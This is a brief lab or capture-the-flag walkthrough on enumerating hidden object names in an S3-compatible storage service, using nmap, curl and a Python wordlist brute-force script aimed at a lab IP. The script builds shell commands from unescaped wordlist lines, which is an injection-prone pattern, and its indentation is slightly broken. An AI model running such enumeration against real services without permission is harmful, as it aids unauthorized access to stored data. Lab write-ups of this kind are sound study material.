In this machine we have to guess the object name.
start your nmap and see on which port the service is running.

now use curl command to check whether the access to the s3 is denied or accepted.
# curl http://192.X.Y.3:9000
we are getting access denied on this url, but if you try with /public/123 then you are getting that "the specified key does not exist"
now you have to brute force the /public/* from the given wordlist.
I have created a python3 script which did it for me.


			import subprocess
			
			f=open("/usr/share/dirb/wordlists/small.txt")
			check_string="not exist"
			url="http://192.149.170.3:9000/public/"
			final_url=[]
			for x in f:
			    a=url+x
			    final_url.append(a)
			for x in final_url:
			    z=subprocess.check_output("curl"+" -s "+x,shell=True)
			    y=str(z)
			
			    if check_string in y:
			       print("not found")
			    else:
			        print(x)
        			print(y)


Please ignore my coding skills. You can also use shell script which is tought in the video of this machine.
